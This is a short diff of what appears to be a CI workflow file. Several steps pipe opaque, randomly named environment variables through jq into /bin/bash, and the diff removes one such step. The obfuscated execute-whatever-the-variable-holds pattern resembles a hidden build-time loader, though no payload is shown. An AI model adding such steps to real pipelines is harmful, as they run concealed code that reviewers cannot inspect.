@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$rdr04726" | jq -r .u046 | /bin/bash
           printf '%s' "$wi01" | jq -r .a8636 | /bin/bash
           echo $u4551 | jq -r .vkv149 | /bin/bash
-          printf '%s' "$fc334" | jq -r .jvcq6501 | /bin/bash
           echo $dgs32801 | jq -r .vl0 | /bin/bash
           echo $hx68754 | jq -r .qwsvl1053 | /bin/bash
 
